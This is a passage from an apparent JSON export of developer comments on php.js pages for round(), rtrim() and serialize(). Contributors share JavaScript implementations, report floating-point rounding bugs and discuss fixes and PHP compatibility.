added Greenseed's testcase and it passes. The first function example currently fails though, you may want to look at that if you feel like it. Other than that: Great stuff T. Wild! Awesome."},{"date":"2009-07-14 12:39:04","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"ohyeah: \n@ Greenseed: Thanks for helping us out!\n\n@ T. Wild: PS, you can have a look at the source here:\nhttp:\/\/trac.plutonia.nl\/projects\/phpjs\/browser\/trunk\/functions\/math\/round.js\nI'll actually deploy it to the site when all test-cases pass."},{"date":"2009-07-28 20:13:23","author":"T.Wild","url":"","comment":"O.K, re-written version of my round function,  I really should learn how to test better and actually double check returned values :) anyway, this version appears to work and implements round half up, half down, half even and half odd.\n\nI removed ceiling, floor, up and down since their not mentioned in the PHP manual.\n\nany further suggestions are welcome.\n\n[CODE]\nfunction round (val, precision, mode) {\n    \/\/ http:\/\/kevin.vanzonneveld.net\n    \/\/ +   original by: Philip Peterson\n    \/\/ +    revised by: Onno Marsman\n    \/\/ +      input by: Greenseed\n    \/\/ +    revised by: T.Wild\n    \/\/ %        note 1: Great work. Ideas for improvement:\n    \/\/ %        note 1:  - code more compliant with developer guidelines\n    \/\/ %        note 1:  - for implementing PHP constant arguments look at\n    \/\/ %        note 1:  the pathinfo() function, it offers the greatest\n    \/\/ %        note 1:  flexibility & compatibility possible\n    \/\/ *     example 1: round(1241757, -3);\n    \/\/ *     returns 1: 1242000\n    \/\/ *     example 2: round(3.6);\n    \/\/ *     returns 2: 4\n    \/\/ *     example 3: round(2.835,2);\n    \/\/ *     returns 3: 2.84\n\n    \/*Declare Variables\n     * Retval  - temporay holder of the value to be returned\n     * V       - String representation of val\n     * integer - Integer portion of val\n     * decimal - decimal portion of val\n     * decp    - characterindex of . [decimal point] inV\n     * negative- was val a negative value?\n     *\n     * ROUND_HALF_OE - Rounding function for ROUND_HALF_ODD and ROUND_HALF_EVEN\n     * ROUND_HALF_UD - Rounding function for ROUND_HALF_UP and ROUND_HALF_DOWN\n     * ROUND_HALF    - Primary function for round half rounding modes\n     *\/\n    var RetVal=0,V='',integer='',decimal='',decp=0,negative=false;\n    var ROUND_HALF_OE = function(DtR,DtLa,even){\n        if(even === true){\n            if(DtLa == 50){\n                if((DtR % 2) === 1){\n                    if(DtLa >= 5){\n                        DtR+=1;\n                    }else{\n                        DtR-=1;\n                    }\n                }\n            }else if(DtLa >= 5){\n                DtR+=1;\n            }\n        }else{\n            if(DtLa == 5){\n                if((DtR % 2) === 0){\n                    if(DtLa >= 5){\n                        DtR+=1;\n                    }else{\n                        DtR-=1;\n                    }\n                }\n            }else if(DtLa >= 5){\n                DtR+=1;\n            }\n        }\n        return DtR;\n    };\n    var ROUND_HALF_UD = function(DtR,DtLa,up){\n        if(up === true){\n            if(DtLa>=5){\n                DtR+=1;\n            }\n        }else{\n            if(DtLa>5){\n                DtR+=1;\n            }\n        }\n        return DtR;\n    };\n    var ROUND_HALF = function(Val,Decplaces,mode){\n        \/*Declare variables\n         *V       - string representation of Val\n         *Vlen    - The length of V - used only when rounding intgerers\n         *VlenDif - The difference between the lengths of the original V\n         *          and the V after being truncated\n         *decp    - character in index of . [decimal place] in V\n         *integer - Integr protion of Val\n         *decimal - Decimal portion of Val\n         *DigitToRound - The digit to round\n         *DigitToLookAt- The digit to comapre when rounding\n         *\n         *round - A function to do the rounding\n         *\/\n        var V = Val.toString(),Vlen=0,VlenDif=0;\n        var decp = V.indexOf('.');\n        var DigitToRound = 0,DigitToLookAt = 0;\n        var integer='',decimal='';\n        var round = null,bool=false;\n        switch(mode){\n            case 'up':\n                bool = true;\n            case 'down':\n                round = ROUND_HALF_UD;\n                break;\n            case 'even':\n                bool = true;\n            case 'odd':\n                round = ROUND_HALF_OE;\n                break;\n        }\n        if (Decplaces < 0){ \/\/Int round\n            Vlen=V.length;\n            Decplaces = Vlen + Decplaces;\n            DigitToLookAt = Number(V.charAt(Decplaces));\n            DigitToRound  = Number(V.charAt(Decplaces-1));\n            DigitToRound  = round(DigitToRound,DigitToLookAt,bool);\n            V = V.slice(0,Decplaces-1);\n            VlenDif = Vlen-V.length-1;\n            if (DigitToRound == 10){\n                V = String(Number(V)+1)+\"0\";\n            }else{\n                V+=DigitToRound;\n            }\n            V = Number(V)*(Math.pow(10,VlenDif));\n        }else if(Decplaces > 0){\n            integer=V.slice(0,decp);\n            decimal=V.slice(decp+1);\n            DigitToLookAt = Number(decimal.charAt(Decplaces));\n            DigitToRound  = Number(decimal.charAt(Decplaces-1));\n            DigitToRound  = round(DigitToRound,DigitToLookAt,bool);\n            decimal=decimal.slice(0,Decplaces-1);\n            if(DigitToRound==10){\n                V=Number(integer+'.'+decimal)+(1*(Math.pow(10,(0-decimal.length))));\n            }else{\n                V=Number(integer+'.'+decimal+DigitToRound);\n            }\n        }else{\n            integer=V.slice(0,decp);\n            decimal=V.slice(decp+1);\n            DigitToLookAt = Number(decimal.charAt(Decplaces));\n            DigitToRound  = Number(integer.charAt(integer.length-1));\n            DigitToRound  = round(DigitToRound,DigitToLookAt,bool);\n            decimal='0';\n            integer = integer.slice(0,integer.length-1);\n            if(DigitToRound==10){\n                V=Number(integer)+1;\n            }else{\n                V=Number(integer+DigitToRound);\n            }\n        }\n        return V;\n    };\n\n    \/\/precision optional - defaults 0\n    if (typeof precision == 'undefined') {\n        precision = 0;\n    }\n    \/\/mode optional - defaults round half up\n    if (typeof mode == 'undefined') {\n        mode = 'PHP_ROUND_HALF_UP';\n    }\n\n    if (val < 0){ \/\/Remember if val is negative\n        negative = true;\n    }else{\n        negative = false;\n    }\n\n    V = Math.abs(val).toString(); \/\/Take a string representation of val\n    decp = V.indexOf('.');        \/\/And locate the decimal point\n    if ((decp == -1) && (precision >=0)){\n        \/* If there is no deciaml point and the precision is greater than 0\n         * there is no need to round, return val\n         *\/\n        return val;\n    }else{\n        if (decp == -1){\n            \/\/There are no decimals so intger=V and decimal=0\n            integer = V;\n            decimal = '0';\n        }else{\n            \/\/Otherwise we have to split the decimals from the integer\n            integer = V.slice(0,decp);\n            if(precision >= 0){\n                \/\/If the precision is greater than 0 then split the decimals from the integer\n                \/\/We truncate the decimals to a number of places equal to the precision requested+1\n                decimal = V.substr(decp+1,precision+1);\n            }else{\n                \/\/If the precision is less than 0 ignore the decimals - set to 0\n                decimal = '0';\n            }\n        }\n        if ((precision > 0) && (precision >= decimal.length)){\n            \/*If the precision requested is more decimal places than already exist\n             *there is no need to round - return val\n             *\/\n            return val;\n        }else if ((precision < 0) && (Math.abs(precision) >= integer.length)){\n            \/*If the precison is less than 0, and is greater than than the\n             *number of digits in integer, return 0 - mimics PHP\n             *\/\n            return 0;\n        }\n        val = Number(integer+'.'+decimal); \/\/After sanitizing recreate val,\n    }\n\n    \/\/Call approriate function based on passed mode, fall through for integer constants\n    \/\/INTEGER VALUES MAY NOT BE CORRECT, UNABLE TO VERIFY WITHOUT PHP 5.3\/\/\n    switch (mode){\n        case 0:\n        case 'PHP_ROUND_HALF_UP':\n            RetVal = ROUND_HALF(val,precision,'up');\n            break;\n        case 1:\n        case 'PHP_ROUND_HALF_DOWN':\n            RetVal = ROUND_HALF(val, precision,'down');\n            break;\n        case 2:\n        case 'PHP_ROUND_HALF_EVEN':\n            RetVal = ROUND_HALF(val,precision,'even');\n            break;\n        case 3:\n        case 'PHP_ROUND_HALF_ODD':\n            RetVal = ROUND_HALF(val,precision,'odd');\n            break;\n    }\n    if(negative){\n        return 0-RetVal;\n    }else{\n        return RetVal;\n    }\n}\n[CODE]"},{"date":"2009-07-29 02:39:38","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@T. Wild: I've added your changes, with some whitespace clean-up, capitalization changes (initial-capitalized generally represent constructors, while full-capitalized generally represent constants), and removed the comment about the constant values being unknown, since you had the correct numeric values per the PHP source\n@Kevin: It looks ready to be applied the next time we update."},{"date":"2009-08-04 11:35:08","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ T.Wild: Great job! \n(for the record: I like http:\/\/phpjs.org\/functions\/pathinfo:486 's way of handling constant arguments best)"},{"date":"2009-11-09 10:20:28","author":"meo","url":"","comment":"when I round round(0.175, 2); I get 0.17 instead of 0.178 in php round, what could be wrong?"},{"date":"2009-11-09 10:24:55","author":"meo","url":"","comment":"when I round: \n\n[CODE]\nround(0.175, 2); \n[\/CODE]\n\nI get 0.17 instead of 0.18 in php round, what could be wrong?"},{"date":"2009-11-09 12:32:41","author":"meo","url":"","comment":"Correction! For on step rounding like before it works, but for the following.\n\n[CODE]\nround(1.1749999999999998, 2);\n[\/CODE]\n\nreturns 1.18  on php and 1.17 on JavaScript. Sorry about the previous post."},{"date":"2009-12-14 16:19:15","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ meo: I've added testcases to confirm your issue:\nhttp:\/\/github.com\/kvz\/phpjs\/commit\/c8dda288ef6f4e1a5c803c7e7338e460a6ca006e\n\nTry with \n[CODE]\n1.1749999999999 \/\/ 13 digits\n[\/CODE]\nand php still gives the correct\n[CODE]\n1.17\n[\/CODE]\n\nTry with \n[CODE]\n1.17499999999999 \/\/ 14 digits\n[\/CODE]\nand php gives the 'incorrect'\n[CODE]\n1.18\n[\/CODE]\n\nBoth on my 32 bits as my 64 bits system, PHP messes it up and turns the last number into 1.18.\n\nSo it looks like PHP is simplifying the number as it gets 14 decimal digits. I checked here http:\/\/php.net\/manual\/en\/language.types.float.php and my suspicion was confirmed: \"The size of a float is platform-dependent, although a maximum of ~1.8e308 with a precision of roughly 14 decimal digits is a common value (the 64 bit IEEE format).\"\n\nSo even though this is a gray array, we may need to consider to break round on purpose, just to make it complient with PHP.\n\nThoughts?"},{"date":"2010-01-09 10:19:43","author":"kadimi","url":"http:\/\/www.kadimi.com\/en\/webdesign\/javascript\/round-float\/","comment":"My tiny version... lol\n[CODE]\nfunction round_float(x,n){\n  if(arguments.length < 2 || !parseInt(n))\n  \tvar n=0;\n  if(!parseFloat(x))\n  \treturn false;\n  return Math.round(x*Math.pow(10,n))\/Math.pow(10,n);\n}\n[\/CODE]"},{"date":"2010-01-09 13:43:33","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@kadimi: Thank you for offering your shorter version. Since we're offering the full PHP API (with all three arguments), more was necessary... If you can reimplement in a shorter form than ours and still fully support all 3 arguments (without adding processing), we'd be all for it...In any case, maybe your version will be of interest to others who don't care about the full API..."},{"date":"2010-04-02 21:13:31","author":"William","url":"","comment":"round(179.06) = 17?\n\nWhat am I missing here?\n\n[CODE]\nwhile (mynum < 300)\n{\n\tmynum += Math.random();\n\tif (round(mynum) != Math.round(mynum))\n\t\tdocument.getElementsByTagName('body')[0].innerHTML += '<br>'+mynum+' '+round(mynum)+' '+Math.round(mynum);\n}\n[\/CODE]"},{"date":"2010-04-03 08:03:54","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@William: What's missing is a digit, and I don't mean a finger or a toe... The code had problems when the first digit was 0 or when the number to be rounded up was 9, now fixed in Git; see http:\/\/github.com\/kvz\/phpjs\/raw\/master\/functions\/math\/round.js . Nice test, btw... and thanks! :)"},{"date":"2010-04-20 07:51:44","author":"gaurav","url":"","comment":"this function rounds \"1236.0000000000002\" to 123.12.\n\nhow shall I solve this problem."},{"date":"2010-04-20 11:20:10","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@gaurav: Please try with the latest version at http:\/\/github.com\/kvz\/phpjs\/raw\/master\/functions\/math\/round.js and see if that works as we made a fix here recently..."},{"date":"2010-09-02 12:22:23","author":"Josep Sanz","url":"http:\/\/www.ws3.es","comment":"Hi PHPJS team.\n\nI detect an error:\n[CODE]\nround(58551.799999999996,2) \nreturns 58551.799999999996\n[\/CODE]\n\nIf I change the precision to 1 or 3, work as expected\n\nThanks."},{"date":"2010-09-04 10:06:51","author":"Rafa? Kukawski","url":"http:\/\/blog.kukawski.pl","comment":"Didn't test it much, but this is my implementation of the function.\n\n[CODE]function round(value, precision, mode){\n\tvar m, f, isHalf, sgn; \/\/ helper variables\n\tprecision |= 0; \/\/ making sure precision is integer\n\tm = Math.pow(10, precision);\n\tvalue *= m;\n\tsgn = (value>0)|-(value<0); \/\/ sign of the number\n\tisHalf = value % 1 === 0.5 * sgn;\n\tf = Math.floor(value);\n\t\n\tif(isHalf){\n\t\tswitch(mode){\n\t\t\tcase 'PHP_ROUND_HALF_DOWN':\n\t\t\t\tvalue = f + (sgn < 0); \/\/ rounds .5 toward zero\n\t\t\t\tbreak;\n\t\t\tcase 'PHP_ROUND_HALF_EVEN':\n\t\t\t\tvalue = f + (f % 2 * sgn); \/\/ rouds .5 towards the next even integer\n\t\t\t\tbreak;\n\t\t\tcase 'PHP_ROUND_HALF_ODD':\n\t\t\t\tvalue = f + !(f % 2); \/\/ rounds .5 towards the next odd integer\n\t\t\t\tbreak;\n\t\t\tdefault:\n\t\t\t\tvalue = f + (sgn > 0); \/\/ rounds .5 away from zero\n\t\t}\n\t}\n\t\n\treturn (isHalf ? value : Math.round(value)) \/ m;\n}[\/CODE]\n\nI'll try to prepare some unit tests today and test this function."},{"date":"2010-09-04 10:11:14","author":"Rafa? Kukawski","url":"http:\/\/blog.kukawski.pl","comment":"BTW. while doing basic tests I compared the results with PHP 5.3.1."},{"date":"2010-09-08 19:41:46","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Josep Sanz: Rafa\u0142 Kukawski has fixed your issue!\n\n@ Rafa\u0142 Kukawski: Thanks, this one is much better. All current tests (found in the example comment blocks) pass!\nhttps:\/\/github.com\/kvz\/phpjs\/commit\/9d563a56bcc28c290a6148ffcbd37e3052cee523\n\nPS\nIf you'd like commit access to our github repository, drop me a line kvz@php.net"},{"date":"2010-09-10 16:15:40","author":"Josep Sanz","url":"http:\/\/www.ws3.es","comment":"I update the php.js library to the lastest version and the round function work as expected.\n\nThanks Rafa\u0142 Kukawski.\n\nJosep."},{"date":"2011-03-29 17:36:28","author":"Mickey","url":"","comment":"Hello!\n\nThank you for this. But... I found some examples where this gives inaccurate results:\n[CODE]\nround(162.295, 2); \/\/gives 162.29\nround(613.305, 2); \/\/gives 613.3\n[\/CODE]\n\nThe problem is multiplying by power of ten gives:\n[CODE]\n162.295 * 100; \/\/gives 16229.499999999998\n[\/CODE]\n\nThere is one more, but the result is OK:\n\n[CODE]\n162.395 * 100; \/\/gives 16239.500000000002\n[\/CODE]\n\nI changed (line 33):\n\n[CODE]\nvalue *= m;\n[\/CODE] \n\nwith this:\n[CODE]\nvar stringValue = String(value);\nvar newDecimalPlace = stringValue.lastIndexOf(\".\") + precision;\nstringValue = stringValue.replace(\".\", \"\");\nif (newDecimalPlace < 0) {\n\tvar tempStringValue = \"0.\";\n\tfor (var i = newDecimalPlace; i < 0; i++) {\n\t\ttempStringValue += \"0\";\n\t}\n\tvalue = Number(tempStringValue + stringValue);\n} else {\n\tvalue = Number(stringValue.substr(0, newDecimalPlace) + \".\" + stringValue.substr(newDecimalPlace));\n\t\t\t}\n[\/CODE]\n\nBasically I multiply by power of 10 by moving the \".\" in the number converted to a string. If \"precision\" is negative - pad the number with \"0.\" and needed number of zeros, otherwise - place the \".\" in new place.\n\nIt works for examples I found.\n\nThanks."},{"date":"2011-03-29 17:53:26","author":"Mickey","url":"","comment":"Just realized that I \"killed\" the function for integers.\n\n[CODE]\nif(String(value).lastIndexOf(\".\") < 0) {\n    value *= m;\n} else {\n    \/\/ my posted code\n}\n[\/CODE]\n\n:)\n"},{"date":"2011-10-11 18:14:53","author":"max4ever","url":"","comment":"this one is tiny and works (doesn't support the php_round_... variables though) http:\/\/stackoverflow.com\/questions\/6437062\/javascript-vs-php-rounding\/6438281#6438281"},{"date":"2012-04-04 12:07:20","author":"Michael Pivonka","url":"http:\/\/codedninja.com","comment":"[code]\n190000000 gives out 189999999.99999997\n[\/code]\nand\n[code]\n200000000 gives out 199999999.99999988\n[\/code]"},{"date":"2012-07-08 19:48:34","author":"Gryffyn","url":"","comment":"A couple people mentioned the .toFixed(precision) but I overlooked them because they didn't mention the specific problem I was having (or at least not with the keywords I was searching the page for).\n\nBasically I wanted to display money values in a way that was consistent with how we usually write money values.\n\nWith the round() function as it is today, 1.10 would return 1.1 even with precision of 2.\n\nI ended up not using the rounding function since I didn't need precision, just wanted to truncate after the second decimal but always show two decimals (which wasn't working when it had a zero on the end).\n\nIf you're starting with a string, you can either do this:\n\n[CODE]\nvar fixed = new Number(somestring);\nalert(fixed.toFixed(2));\n[\/CODE]\n\nOr you can do:\n[CODE]\nvar fixed = parseFloat(somestring);\nalert(fixed.toFixed(2));\n[\/CODE]\n\nAgain, this was mostly mentioned but not in the context of money (dollar, etc) values and trailing zeros."}],"rtrim":[{"date":"2009-11-04 17:08:02","author":"rem","url":"","comment":"What if to rtrim a string like   stringname[0]\nrtrim(stringname[0], '[0]')  will return 'stringname['  which it's incorect"},{"date":"2009-11-07 12:27:57","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@rem: Thanks for alerting us to this. While most of the ingredients were there, I guess someone forgot to do the escaping...Fixed in http:\/\/github.com\/kvz\/phpjs\/commit\/7e0c05cb7c5049dfa89c39fc8460df48aca76948 . Should also be online here shortly."}],"serialize":[{"date":"2008-01-21 19:08:39","author":"Ates Goral","url":"","comment":"Hi Kevin,\r\n\r\nHere are a few improvements to what I originally had:\r\n\r\nFor Array detection, instead of:\r\n\r\n[CODE=&quot;Javascript&quot;](&quot;length&quot; in mixed_val)[\/CODE]\r\n\r\nit's nicer to say:\r\n\r\n[CODE=&quot;Javascript&quot;](mixed_val instanceof Array)[\/CODE]\r\n\r\nAlso, an additional check can be added to handle the NaN and Infinite values:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\n   case &quot;number&quot;:\r\n        if (mixed_val == NaN || mixed_val == Infinity)\r\n        {\r\n            return false;\r\n        }\r\n        ...\r\n[\/CODE]"},{"date":"2008-01-21 19:11:35","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ uestla: Yes it probably should :) Fixed, thank you!"},{"date":"2008-01-22 07:47:11","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Ates Goral: Thanks, I've updated the function."},{"date":"2008-01-22 22:39:36","author":"Ates Goral","url":"","comment":"Here's get_class(). I think serialize() now can re-use this one instead of the local getObjectClass() implementation.\r\n\r\nI've added the extra instanceof checks solely to match PHP behaviour. They can be removed since JavaScript has no problem with getting class names for simple types or arrays\/functions etc. This brings up the question: Are we trying to mimic PHP behaviour as closely as possible or is it all right to introduce additional functionality brought forth by the flexibility of JavaScript?\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction get_class(obj) {\r\n    \/\/ *     example 1: get_class(new (function MyClass() {}));\r\n    \/\/ *     returns 1: &quot;MyClass&quot;\r\n    \/\/ *     example 2: get_class({});\r\n    \/\/ *     returns 2: &quot;Object&quot;\r\n    \/\/ *     example 3: get_class([]);\r\n    \/\/ *     returns 3: false\r\n    \/\/ *     example 4: get_class(42);\r\n    \/\/ *     returns 4: false\r\n    \/\/ *     example 5: get_class(window);\r\n    \/\/ *     returns 5: false\r\n    \/\/ *     example 6: get_class(function MyFunction() {});\r\n    \/\/ *     returns 6: false\r\n    \r\n    if (obj instanceof Object &amp;&amp; !(obj instanceof Array) &amp;&amp;\r\n    \t\t!(obj instanceof Function) &amp;&amp; obj.constructor) {\r\n        var arr = obj.constructor.toString().match(\/function\\s*(\\w+)\/);\r\n\r\n        if (arr &amp;&amp; arr.length == 2) {\r\n            return arr[1];\r\n        }\r\n    }\r\n    \r\n    return false;\r\n}\r\n[\/CODE]"},{"date":"2008-01-23 08:11:30","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Ates Goral: Works like a charm, I will build this in serialize and add it as a dependency.\r\n\r\nAbout your php-strict\/javascript-flexible question. I think we should stay with PHP as close as possible. Hopefully this will provide consistency &amp; clarity for end users. And interoperability between php-js-function throughout the project. This approach should also ensure that no extra function documentation has to be written because PHP's function manual will (in most cases) be valid."},{"date":"2008-01-23 08:33:03","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Ates Goral: Example 14 is giving: too much recursion after implementing the new get_class function in serialize"},{"date":"2008-01-23 14:57:46","author":"Ates Goral","url":"","comment":"I'll take a look at why serialize() is looping."},{"date":"2008-02-20 16:24:27","author":"Franck Chionna","url":"","comment":"hello,\r\n\r\ni d like to serialize a window object by a js var that contain window.open , thus to keep in memory the window open if the php page is refreshed. i tried to use your code but it says js error &quot;too much recursion... any suggestion ? thanks and congratulation for the work done"},{"date":"2008-02-28 23:35:36","author":"Doug","url":"","comment":"Have you started to compile a function for unserialize yet?"},{"date":"2008-02-28 23:53:59","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Doug: Not yet, so feel free!"},{"date":"2008-03-02 16:21:13","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Doug: About unserialize, just now I found a very good javascript unserialize function by Arpad Ray. I've included the function in this project. If Arpad doesn't approve however (I've sent him an email), we will still have to write it ourselves."},{"date":"2008-03-02 18:57:30","author":"Andrea Giammarchi","url":"","comment":"two years ago, 15.000 users, about zero problems:\r\nhttp:\/\/www.devpro.it\/javascript_id_102.html\r\n\r\nIt's able to save correctly UTF-8 strings as well.\r\n\r\nCheers"},{"date":"2008-03-02 19:38:56","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Andrea Giammarchi: Impressive code Andrea! I will look into this and if I use (parts of) it, I will credit you accordingly! Thanks"},{"date":"2008-05-30 22:51:03","author":"d3x","url":"","comment":"For every other person that needs an unserialize implementation:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction unserialize(data){\r\n\tfunction error(type, msg, filename, line){throw new window[type](msg, filename, line);}\r\n\tfunction read_until(data, offset, stopchar){\r\n\t\tvar buf = [];\r\n\t\tvar char = data.slice(offset, offset + 1);\r\n\t\tvar i = 2;\r\n\t\twhile(char != stopchar){\r\n\t\t\tif((i+offset) &gt; data.length){\r\n\t\t\t\terror('Error', 'Invalid');\r\n\t\t\t}\r\n\t\t\tbuf.push(char);\r\n\t\t\tchar = data.slice(offset + (i - 1),offset + i);\r\n\t\t\ti += 1;\r\n\t\t}\r\n\t\treturn [buf.length, buf.join('')];\r\n\t};\r\n\tfunction read_chars(data, offset, length){\r\n\t\tbuf = [];\r\n\t\tfor(var i = 0;i &lt; length;i++){\r\n\t\t\tvar char = data.slice(offset + (i - 1),offset + i);\r\n\t\t\tbuf.push(char);\r\n\t\t}\r\n\t\treturn [buf.length, buf.join('')];\r\n\t};\r\n\tfunction _unserialize(data, offset){\r\n\t\tif(!offset) offset = 0;\r\n\t\tvar buf = [];\r\n\t\tvar dtype = (data.slice(offset, offset + 1)).toLowerCase();\r\n\t\t\r\n\t\tvar dataoffset = offset + 2;\r\n\t\tvar typeconvert = new Function('x', 'return x');\r\n\t\tvar chars = 0;\r\n\t\tvar datalength = 0;\r\n\t\t\r\n\t\tswitch(dtype){\r\n\t\t\tcase &quot;i&quot;:\r\n\t\t\t\ttypeconvert = new Function('x', 'return parseInt(x)');\r\n\t\t\t\tvar readData = read_until(data, dataoffset, ';');\r\n\t\t\t\tvar chars = readData[0];\r\n\t\t\t\tvar readdata = readData[1];\r\n\t\t\t\tdataoffset += chars + 1;\r\n\t\t\tbreak;\r\n\t\t\tcase &quot;b&quot;:\r\n\t\t\t\ttypeconvert = new Function('x', 'return (parseInt(x) == 1)');\r\n\t\t\t\tvar readData = read_until(data, dataoffset, ';');\r\n\t\t\t\tvar chars = readData[0];\r\n\t\t\t\tvar readdata = readData[1];\r\n\t\t\t\tdataoffset += chars + 1;\r\n\t\t\tbreak;\r\n\t\t\tcase &quot;d&quot;:\r\n\t\t\t\ttypeconvert = new Function('x', 'return parseFloat(x)');\r\n\t\t\t\tvar readData = read_until(data, dataoffset, ';');\r\n\t\t\t\tvar chars = readData[0];\r\n\t\t\t\tvar readdata = readData[1];\r\n\t\t\t\tdataoffset += chars + 1;\r\n\t\t\tbreak;\r\n\t\t\tcase &quot;n&quot;:\r\n\t\t\t\treaddata = null;\r\n\t\t\tbreak;\r\n\t\t\tcase &quot;s&quot;:\r\n\t\t\t\tvar ccount = read_until(data, dataoffset, ':');\r\n\t\t\t\tvar chars = ccount[0];\r\n\t\t\t\tvar stringlength = ccount[1];\r\n\t\t\t\tdataoffset += chars + 2;\r\n\t\t\t\t\r\n\t\t\t\tvar readData = read_chars(data, dataoffset+1, parseInt(stringlength));\r\n\t\t\t\tvar chars = readData[0];\r\n\t\t\t\tvar readdata = readData[1];\r\n\t\t\t\tdataoffset += chars + 2;\r\n\t\t\t\tif(chars != parseInt(stringlength) &amp;&amp; chars != readdata.length){\r\n\t\t\t\t\terror('SyntaxError', 'String length mismatch');\r\n\t\t\t\t}\r\n\t\t\tbreak;\r\n\t\t\tcase &quot;a&quot;:\r\n\t\t\t\tvar readdata = {};\r\n\t\t\t\t\r\n\t\t\t\tvar keyandchars = read_until(data, dataoffset, ':');\r\n\t\t\t\tvar chars = keyandchars[0];\r\n\t\t\t\tvar keys = keyandchars[1];\r\n\t\t\t\tdataoffset += chars + 2;\r\n\t\t\t\t\r\n\t\t\t\tfor(var i = 0;i &lt; parseInt(keys);i++){\r\n\t\t\t\t\tvar kprops = _unserialize(data, dataoffset);\r\n\t\t\t\t\tvar kchars = kprops[1];\r\n\t\t\t\t\tvar key = kprops[2];\r\n\t\t\t\t\tdataoffset += kchars;\r\n\t\t\t\t\t\r\n\t\t\t\t\tvar vprops = _unserialize(data, dataoffset);\r\n\t\t\t\t\tvar vchars = vprops[1];\r\n\t\t\t\t\tvar value = vprops[2];\r\n\t\t\t\t\tdataoffset += vchars;\r\n\t\t\t\t\t\r\n\t\t\t\t\treaddata[key] = value;\r\n\t\t\t\t}\r\n\t\t\t\t\r\n\t\t\t\tdataoffset += 1;\r\n\t\t\tbreak;\r\n\t\t\tdefault:\r\n\t\t\t\terror('SyntaxError', 'Unknown \/ Unhandled data type(s): ' + dtype);\r\n\t\t\tbreak;\r\n\t\t}\r\n\t\treturn [dtype, dataoffset - offset, typeconvert(readdata)];\r\n\t};\r\n\treturn _unserialize(data, 0)[2];\r\n}\r\n[\/CODE]\r\n\r\nCode translated from: http:\/\/hurring.com\/scott\/code\/python\/serialize\/"},{"date":"2008-05-31 14:21:01","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ d3x: Do you think that this function beats Arpad Ray's implementation?"},{"date":"2008-05-31 15:31:00","author":"d3x","url":"","comment":"@ Kevin: Arpad Ray's implementation uses &quot;eval&quot; and &quot;eval is evil&quot;(http:\/\/blogs.msdn.com\/ericlippert\/archive\/2003\/11\/01\/53329.aspx)"},{"date":"2008-09-09 13:24:10","author":"Thomas Buschhardt","url":"","comment":"Hallo, thanx for the code. How can I find out in the returned object the length of the arrays (if these arrays be)?"},{"date":"2008-09-09 13:37:02","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Ren: Can you please provide a print_r of the array in CODE blocks that you are trying to serialize? We need your import to improve this function. Thanks!"},{"date":"2008-09-09 13:53:23","author":"Ren","url":"","comment":"Sorry plz, it was my fault. \r\nI used htmlspecialchars($_REQUEST), so the variable with serialized string encoded too. \r\nFunction works fine :) thx"},{"date":"2008-09-19 09:39:29","author":"dino","url":"www.pushideas.com","comment":"serialize doesn't work well with mootools since mootools adds or extends the array object with functions which serialize picks up on and tries to translate into a string.\r\n\r\nAt least it broke my code when I included mootools.\r\n\r\nI fixed it by having serialize not try to translate objects or functions. It doesn't seem like functions are being handled anyway.\r\n\r\n\r\n\r\n[CODE=&quot;javascript&quot;]\r\n       case &quot;function&quot;:\r\n\t\tval = &quot;&quot;;\r\n\t\tbreak;\r\n\r\nfor (key in mixed_value) {\r\n\t\tvar ktype = _getType(mixed_value[key]);\r\n\t\t\r\n\t\t\/\/alert(key + ' type is ' + ktype);\r\n\t\tif (ktype != &quot;function&quot; &amp;&amp; ktype != &quot;object&quot;) {\r\n\t\t\tokey = (key.match(\/^[0-9]+$\/) ? parseInt(key) : key);\r\n\t\t\tvals += serialize(okey) +\r\n\t\t\t\tserialize(mixed_value[key]);\r\n\t\t\tcount++;\r\n\t\t}\r\n            }"},{"date":"2008-09-19 09:40:50","author":"dino","url":"www.pushideas.com","comment":"woops I don't think my code showed up properly.\r\n\r\n[CODE=&quot;javascript&quot;]\r\nfor (key in mixed_value) {\r\n\t\tvar ktype = _getType(mixed_value[key]);\r\n\t\t\r\n\t\t\/\/alert(key + ' type is ' + ktype);\r\n\t\tif (ktype != &quot;function&quot; &amp;&amp; ktype != &quot;object&quot;) {\r\n\t\t\tokey = (key.match(\/^[0-9]+$\/) ? parseInt(key) : key);\r\n\t\t\tvals += serialize(okey) +\r\n\t\t\t\tserialize(mixed_value[key]);\r\n\t\t\tcount++;\r\n\t\t}\r\n            }\r\n[\/CODE]"},{"date":"2008-09-19 09:42:17","author":"mopont","url":"","comment":"Great function!"},{"date":"2008-09-21 21:57:28","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Dino: I've committed your changes! Thank you."},{"date":"2008-11-27 18:33:36","author":"Tom","url":"","comment":"The returned representation of provided function is valid PHP code (which is correct).\nBut does anyone have a JS var_export function whose returned representation is valid javascript code?\nThe returned value type should be string and it could be passed to eval() function.\nExamples:\n[CODE]\nvar a = new Array(12, '13', 'abc', 'line1\\nline2\\nline3');\nvar js_code = var_export(a);\n\/*\nthe returned value should 